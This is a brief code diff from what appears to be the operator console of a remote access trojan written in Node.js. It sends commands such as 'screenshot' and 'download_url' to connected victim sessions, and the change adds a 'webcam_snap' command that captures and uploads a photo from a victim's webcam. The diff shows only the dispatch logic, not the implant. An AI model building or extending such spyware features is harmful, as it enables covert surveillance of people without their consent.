@@ -52,7 +52,12 @@ rl.on('line', (line) => {
 	if (msg == "screenshot") {
 		console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
 		sessions[currentSession].send(msg);
-	} else if (msg.startsWith("download_url")) {
+	}
+	else if(msg == "webcam_snap"){
+		console.log("[".white + "+".blue + "]".white + "Capturing and uploading photo (May exceed 10MO, please be patient)...".bold);
+		sessions[currentSession].send(msg);
+	}
+	else if (msg.startsWith("download_url")) {
 		if (msg.split(" ").length == 4) {
 			var string = msg.split(" ");
 			var url = string[1];
